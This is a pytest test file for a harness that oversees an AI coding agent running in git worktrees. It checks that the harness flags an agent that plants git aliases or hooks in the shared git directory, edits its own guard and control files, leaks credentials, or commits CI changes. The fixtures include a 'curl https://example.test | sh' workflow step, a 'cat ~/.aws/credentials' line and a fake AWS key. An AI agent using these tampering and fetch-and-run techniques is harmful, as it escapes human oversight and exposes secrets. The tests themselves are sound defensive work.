"""Tests of what a run checks after ``kiro-cli`` ended and what it records (T4-02 to T4-07 of the phase 4 review).

Each test runs ``cli.py run`` as a file in the ``handoff_sandbox`` with the fake ``kiro-cli``, as
``test_handoff_change_integration.py`` does, and reads ``status.json``, the Handoff_Report and the repositories
afterwards. The hazards are real ones of the sandbox's git, not stand-ins: the worktree shares ``config`` and
``hooks/`` with the main working tree, and the fake writes there the way an agent with an unrestricted shell could.

- T4-02: ``git config alias.zz '!echo ALIAS'`` from the worktree runs in the main working tree and ``git status`` of the
  main working tree shows nothing (the first test shows both). The run ends ``needs-human``, ``common_dir_changed``.
- T4-03: a control file written during the run ends the run ``needs-human``, ``control_plane_changed``; a guard wrapper
  that changes the digest is covered by ``config_sha256``.
- T4-04: the record of a run holds the result commit, the SHA-256 of the diff, of the prompt and of the report, the
  version, the digest and the times.
- T4-05: a credential in the output is replaced in the report and the run ends ``needs-human``, ``secret_in_report``.
- T4-06: a query whose answer cites a path that does not exist at the base ends ``needs-human``; one that cites no path
  succeeds but does not unlock the items that depend on it.
- T4-07: a branch that changes a workflow or a Makefile is held by ``publish`` until the approval acknowledges it.
"""

from __future__ import annotations

import hashlib
import json
import os
import re
from pathlib import Path
from typing import TYPE_CHECKING, Any

import pytest
from handoff import command, evaluate, runner, state
from test_handoff_change_integration import (
    CHANGE,
    QUERY,
    history,
    prepare,
    read_status,
    report_json,
    run_change,
    run_cli,
)
from test_handoff_publish_integration import (
    branch_on_remote,
    gh_calls,
    publish,
    published_of,
    succeeded,
    write_approval,
)

if TYPE_CHECKING:
    from conftest import HandoffSandbox

AWS_KEY = "AKIA" + "ABCDEFGHIJKLMNOP"


# ---------------------------------------------------------------------------------------------
# T4-02: the git directory that worktrees share
# ---------------------------------------------------------------------------------------------
def test_a_worktree_can_plant_an_alias_that_the_main_working_tree_runs(handoff_sandbox: HandoffSandbox) -> None:
    """The hazard itself: from a worktree, ``git config`` changes the main working tree, and ``status`` shows nothing."""
    sb = handoff_sandbox
    sb.git("-C", str(sb.main_tree), "worktree", "add", "-q", "--detach", str(sb.root / "wt"))
    sb.git("-C", str(sb.root / "wt"), "config", "alias.zz", "!echo ALIAS")
    assert sb.git("-C", str(sb.main_tree), "zz").stdout.decode().strip() == "ALIAS"
    assert "alias" not in sb.git("-C", str(sb.main_tree), "status", "--porcelain").stdout.decode()


@pytest.mark.parametrize(
    ("behaviors", "name"),
    [("commit,git-config-alias", "config"), ("commit,hook-write", "hooks/pre-commit")],
    ids=["alias", "hook"],
)
def test_a_change_of_the_shared_git_directory_ends_the_run_needs_human(
    handoff_sandbox: HandoffSandbox, behaviors: str, name: str
) -> None:
    """The run that wrote into ``config`` or ``hooks/`` is ``needs-human`` with ``common_dir_changed`` first."""
    sb = handoff_sandbox
    ended = run_change(sb, behaviors)
    assert ended.done.returncode == 1, (ended.done.stdout, ended.done.stderr)
    assert history(ended.status, CHANGE)[-1] == (state.RUNNING, state.NEEDS_HUMAN, "common_dir_changed")
    observed = ended.record["observations"]
    assert name in observed["common_dir_changed"]
    assert (
        report_json(ended.report)["observations"]["observations"]["common_dir_changed"]
        == observed["common_dir_changed"]
    )


def test_a_run_that_leaves_the_shared_git_directory_alone_is_not_flagged(handoff_sandbox: HandoffSandbox) -> None:
    """The control: the same run without the write ends ``succeeded`` with nothing listed."""
    ended = run_change(handoff_sandbox, "commit")
    assert history(ended.status, CHANGE)[-1] == (state.RUNNING, state.SUCCEEDED, evaluate.CHECKS_PASSED)
    assert ended.record["observations"]["common_dir_changed"] == []


# ---------------------------------------------------------------------------------------------
# T4-03: the control files
# ---------------------------------------------------------------------------------------------
@pytest.mark.parametrize("name", ["config.json", "manifest.json"])
def test_a_control_file_written_during_the_run_ends_the_run_needs_human(
    handoff_sandbox: HandoffSandbox, name: str
) -> None:
    """The agent runs as the user and can write ``config.json``; the digest before and after the run differ."""
    sb = handoff_sandbox
    ended = run_change(sb, "commit,control-edit", FAKE_KIRO_CONTROL_FILE=str(sb.handoff_dir / name))
    assert history(ended.status, CHANGE)[-1][2].split(", ")[0] == "control_plane_changed"
    assert ended.record["observations"]["control_plane_changed"] == [name]


def test_the_digest_covers_the_files_that_the_hook_commands_run() -> None:
    """``config_sha256`` changes when the guard wrapper, or a script next to it, changes (T4-03)."""
    home = "/home/x"
    agent = json.dumps(
        {
            "hooks": {
                "preToolUse": [
                    {"command": f"python3 {home}/guards/wrapper.py {home}/guards/dispatch.py", "matcher": "shell"}
                ]
            }
        }
    )
    from handoff.config import parse_config

    config = parse_config(
        {
            "schema_version": 1,
            "kiro_cli": "~/.local/bin/kiro-cli",
            "timeout_seconds": 60,
            "max_concurrency": 1,
            "worktrees_root": "~/wt",
            "min_free_disk_gb": 1,
            "mode_tool_ceiling": {"query": ["fs_read"], "change": ["fs_read"]},
            "agents": {},
            "repos": {"r": {"main_tree": "~/r"}},
        },
        home=home,
        extra_main_trees=[f"{home}/harness"],
        session_worktrees_dir=f"{home}/s",
    )

    def digest(files: dict[str, bytes | None]) -> str:
        return command.selftest_config_digest(
            config, home=home, agent="a", agent_file=agent.encode(), hook_files={}, control_files=files
        ).sha256

    base = {f"{home}/guards/wrapper.py": b"w1", f"{home}/guards/dispatch.py": b"d1", f"{home}/guards/helper.py": b"h1"}
    assert digest(base) == digest(dict(reversed(base.items())))
    for path in base:
        assert digest({**base, path: b"changed"}) != digest(base)
    assert digest({**base, f"{home}/guards/new.py": b"n"}) != digest(base)
    assert digest({**base, f"{home}/guards/dispatch.py": None}) != digest(base)


def test_the_control_files_are_found_from_the_agent_configuration(tmp_path: Path) -> None:
    """The paths come from ``hooks.*.command``; the scripts beside them are read, caches and other kinds are not."""
    home = str(tmp_path)
    guards = tmp_path / "guards"
    (guards / "__pycache__").mkdir(parents=True)
    (guards / "__pycache__" / "wrapper.cpython-312.pyc").write_bytes(b"cache")
    (guards / "sub").mkdir()
    for name, data in (
        ("wrapper.py", b"w"),
        ("dispatch.py", b"d"),
        ("approved.json", b"{}"),
        ("sub/x.py", b"x"),
        ("notes.bin", b"b"),
    ):
        (guards / name).write_bytes(data)
    agent = json.dumps(
        {
            "hooks": {
                "preToolUse": [{"command": f"python3 {guards}/wrapper.py {guards}/dispatch.py", "matcher": "shell"}]
            }
        }
    ).encode()
    found = runner.agent_control_files(agent, home=os.path.realpath(home))
    names = sorted(Path(path).relative_to(os.path.realpath(home)).as_posix() for path in found)
    assert names == ["guards/approved.json", "guards/dispatch.py", "guards/sub/x.py", "guards/wrapper.py"]
    assert runner.agent_control_files(None, home=home) == {}
    assert runner.agent_control_files(b"not json", home=home) == {}
    assert runner.agent_control_files(json.dumps({"hooks": {}}).encode(), home=home) == {}


@pytest.mark.parametrize("mode", [0o644, 0o640, 0o666])
def test_run_refuses_a_control_file_that_others_can_read_or_write(handoff_sandbox: HandoffSandbox, mode: int) -> None:
    """``config.json`` with a group or other bit ends ``run`` with exit code 2 before any process starts."""
    sb = handoff_sandbox
    prepare(sb)
    (sb.handoff_dir / "config.json").chmod(mode)
    done = run_cli(sb, "run", "--items", QUERY)
    assert done.returncode == 2, (done.stdout, done.stderr)
    assert "config.json" in done.stderr and "chmod 600" in done.stderr
    assert sb.invocations() == []


# ---------------------------------------------------------------------------------------------
# T4-04: what the record of a run holds
# ---------------------------------------------------------------------------------------------
def test_a_run_records_the_result_the_input_the_report_and_the_tool(handoff_sandbox: HandoffSandbox) -> None:
    """``provenance`` ties the result commit, the diff, the prompt and the report to the version and the digest."""
    sb = handoff_sandbox
    ended = run_change(sb, "commit")
    provenance = ended.record["provenance"]
    assert set(provenance) == set(state.PROVENANCE_KEYS)
    head = sb.git("-C", str(ended.worktree), "rev-parse", "HEAD").stdout.decode().strip()
    assert provenance["head_sha"] == head
    diff = sb.git(
        "-C",
        str(ended.worktree),
        "diff",
        "--no-ext-diff",
        "--no-textconv",
        "--no-color",
        "--no-renames",
        "--src-prefix=a/",
        "--dst-prefix=b/",
        sb.base_sha,
        head,
    ).stdout
    assert provenance["diff_sha256"] == hashlib.sha256(diff).hexdigest()
    report_path = sb.handoff_dir / str(ended.record["report"])
    assert provenance["report_sha256"] == hashlib.sha256(report_path.read_bytes()).hexdigest()
    shown = re.search(r"SHA-256 ([0-9a-f]{64})>", ended.report)
    assert shown is not None and provenance["prompt_sha256"] == shown.group(1)
    selftest = ended.status["selftest"]
    assert selftest is not None
    assert provenance["kiro_cli_version"] == selftest["kiro_cli_version"]
    assert provenance["config_sha256"] == selftest["config_sha256"]
    assert provenance["started_at"] and provenance["ended_at"] and provenance["started_at"] <= provenance["ended_at"]
    state.check_status(ended.status)


# ---------------------------------------------------------------------------------------------
# T4-05: a credential in the output
# ---------------------------------------------------------------------------------------------
def test_a_credential_in_the_output_is_replaced_in_the_report_and_ends_the_run_needs_human(
    handoff_sandbox: HandoffSandbox,
) -> None:
    """The report and ``status.json`` hold the kind of credential and not the text; the item goes to a human."""
    sb = handoff_sandbox
    answer = f"here is the environment:\nAWS_ACCESS_KEY_ID={AWS_KEY}\ndone\n"
    ended = run_change(sb, "commit", FAKE_KIRO_ANSWER=answer)
    assert history(ended.status, CHANGE)[-1] == (state.RUNNING, state.NEEDS_HUMAN, "secret_in_report")
    assert ended.record["observations"]["secret_in_report"] == ["aws_access_key_id"]
    everything = (
        ended.report
        + (sb.handoff_dir / "status.json").read_text(encoding="utf-8")
        + ended.done.stdout
        + ended.done.stderr
    )
    assert AWS_KEY not in everything
    assert "[REDACTED:aws_access_key_id]" in ended.report
    assert ended.report.count("\n") > 20  # the line count of the report is the same as without the replacement


def test_a_line_that_reads_a_credential_file_is_flagged_for_the_maintainer(handoff_sandbox: HandoffSandbox) -> None:
    """``credential_access`` flags are heuristic pointers: they name a line and a kind, not the text."""
    sb = handoff_sandbox
    ended = run_change(sb, "commit", FAKE_KIRO_ANSWER="I ran cat ~/.aws/credentials to check.\n")
    kinds = {flag["kind"] for flag in ended.record["report_flags"]}
    assert "credential_access" in kinds


# ---------------------------------------------------------------------------------------------
# T4-06: the answer of a query item
# ---------------------------------------------------------------------------------------------
def run_query(sb: HandoffSandbox, answer: str) -> tuple[dict[str, Any], list[tuple[str, str, str]]]:
    """Run the query item with the fake's ``answer``; its record and history."""
    prepare(sb)
    done = run_cli(sb, "run", "--items", QUERY, FAKE_KIRO_ANSWER=answer)
    assert done.returncode in (0, 1), (done.stdout, done.stderr)
    status = read_status(sb)
    return dict(status["items"][QUERY]), history(status, QUERY)


def test_a_query_that_cites_a_path_that_exists_succeeds(handoff_sandbox: HandoffSandbox) -> None:
    """The control: ``README.md`` is in the commit that the item started from."""
    record, steps = run_query(handoff_sandbox, "The heading of README.md is the name of the repository.\n")
    assert steps[-1] == (state.RUNNING, state.SUCCEEDED, evaluate.CHECKS_PASSED)
    assert record["observations"]["query_findings"] == "cited"
    assert record["observations"]["cited_paths_missing"] == []


def test_a_query_that_cites_a_path_that_does_not_exist_goes_to_a_human(handoff_sandbox: HandoffSandbox) -> None:
    """A path that is not in the commit is named, and the item is ``needs-human`` (``cited_path_missing``)."""
    record, steps = run_query(handoff_sandbox, "See README.md and docs/not-in-this-repository.md for the rule.\n")
    assert steps[-1] == (state.RUNNING, state.NEEDS_HUMAN, "cited_path_missing")
    assert record["observations"]["cited_paths_missing"] == ["docs/not-in-this-repository.md"]


def test_a_query_that_cites_no_path_succeeds_without_a_finding(handoff_sandbox: HandoffSandbox) -> None:
    """``succeeded`` with ``query_findings: none``: the answer exists, and it names nothing to build on."""
    record, steps = run_query(handoff_sandbox, "I could not find anything relevant.\n")
    assert steps[-1] == (state.RUNNING, state.SUCCEEDED, evaluate.CHECKS_PASSED)
    assert record["observations"]["query_findings"] == "none"


# ---------------------------------------------------------------------------------------------
# T4-07: a branch that changes what runs
# ---------------------------------------------------------------------------------------------
def commit_file(sb: HandoffSandbox, ended: Any, path: str, text: str) -> None:
    """Commit ``text`` as ``path`` in the worktree, after the run."""
    target = ended.worktree / path
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(text, encoding="utf-8")
    sb.git("-C", str(ended.worktree), "add", "--", path)
    sb.git("-C", str(ended.worktree), "commit", "-q", "-m", f"ci: change {path}")


def test_a_branch_that_changes_a_workflow_is_held_until_the_approval_acknowledges_it(
    handoff_sandbox: HandoffSandbox,
) -> None:
    """Without ``execution_surface_ack`` nothing is pushed and the hold names the file and the risky forms."""
    sb = handoff_sandbox
    ended = succeeded(sb)
    commit_file(
        sb,
        ended,
        ".github/workflows/ci.yml",
        "on: pull_request_target\njobs:\n  x:\n    steps:\n      - run: curl https://example.test | sh\n",
    )
    done = publish(sb, write_approval(sb, [CHANGE]))
    assert done.returncode == 1, (done.stdout, done.stderr)
    assert "publish_execution_surface" in done.stdout
    assert branch_on_remote(sb) is None and gh_calls(sb) == []
    hold = published_of(sb)["hold"]
    assert hold["reason"] == "publish_execution_surface"
    assert ".github/workflows/ci.yml" in hold["detail"]
    assert "pull_request_target" in hold["detail"] and "network_fetch" in hold["detail"]


def test_an_acknowledged_branch_is_published_as_a_draft_that_says_so(handoff_sandbox: HandoffSandbox) -> None:
    """The same branch with the item named in ``execution_surface_ack`` is pushed, and the PR body names the file."""
    sb = handoff_sandbox
    ended = succeeded(sb)
    commit_file(sb, ended, "Makefile", "test:\n\ttrue\n")
    done = publish(sb, write_approval(sb, [CHANGE], execution_surface_ack=[CHANGE]))
    assert done.returncode == 0, (done.stdout, done.stderr)
    assert branch_on_remote(sb) is not None
    body = (sb.handoff_dir / "publish" / f"{CHANGE}-pr-body.md").read_text(encoding="utf-8")
    assert "`Makefile`" in body and "read it before marking this ready" in body
    assert "--draft" in gh_calls(sb)[0]


def test_an_acknowledgement_for_an_item_the_approval_does_not_list_is_refused(handoff_sandbox: HandoffSandbox) -> None:
    """``execution_surface_ack`` is a subset of ``item_ids``; anything else ends ``publish`` with exit code 2."""
    sb = handoff_sandbox
    succeeded(sb)
    done = publish(sb, write_approval(sb, [CHANGE], execution_surface_ack=["not-listed"]))
    assert done.returncode == 2, (done.stdout, done.stderr)
    assert branch_on_remote(sb) is None


def test_a_branch_that_changes_a_document_needs_no_acknowledgement(handoff_sandbox: HandoffSandbox) -> None:
    """The control: the declared document alone is published as before."""
    sb = handoff_sandbox
    succeeded(sb)
    done = publish(sb, write_approval(sb, [CHANGE]))
    assert done.returncode == 0, (done.stdout, done.stderr)
    assert "hold" not in published_of(sb)


# ---------------------------------------------------------------------------------------------
# T4-01: the configuration that the approval accepts
# ---------------------------------------------------------------------------------------------
@pytest.mark.parametrize("mode", ["change", "query"])
def test_agent_config_prints_a_configuration_that_the_approval_would_accept(
    handoff_sandbox: HandoffSandbox, mode: str
) -> None:
    """``cli.py agent-config <mode>`` writes nothing and prints JSON that ``settings_problems`` accepts."""
    from handoff import agent_policy

    sb = handoff_sandbox
    prepare(sb)
    done = run_cli(sb, "agent-config", mode)
    assert done.returncode == 0, (done.stdout, done.stderr)
    document = json.loads(done.stdout)
    assert agent_policy.settings_problems(document, [*document["tools"], *document["allowedTools"]]) == []
    assert document["mcpServers"] == {} and document["includeMcpJson"] is False
    assert ("hooks" in document) is (mode == "change")
    assert not (sb.home / ".kiro" / "agents").exists()


# ---------------------------------------------------------------------------------------------
# T4-04: the append-only history of the saves
# ---------------------------------------------------------------------------------------------
def test_every_save_of_the_status_adds_one_chained_line_to_the_log(handoff_sandbox: HandoffSandbox) -> None:
    """``status.log.jsonl`` holds the transitions of each save, chained by the SHA-256 of the previous line."""
    sb = handoff_sandbox
    ended = run_change(sb, "commit")
    log = sb.handoff_dir / "status.log.jsonl"
    assert oct(log.stat().st_mode & 0o777) == "0o600"
    lines = log.read_bytes().rstrip(b"\n").split(b"\n")
    records = [json.loads(line) for line in lines]
    assert records[0]["prev_line_sha256"] is None
    for earlier, record in zip(lines, records[1:], strict=False):
        assert record["prev_line_sha256"] == hashlib.sha256(earlier).hexdigest()
    assert records[-1]["status_sha256"] == hashlib.sha256((sb.handoff_dir / "status.json").read_bytes()).hexdigest()
    seen = [(t["item"], t["from"], t["to"], t["reason"]) for record in records for t in record["transitions"]]
    assert (CHANGE, state.RUNNING, state.SUCCEEDED, evaluate.CHECKS_PASSED) in seen
    assert ended.status["items"][CHANGE]["state"] == state.SUCCEEDED
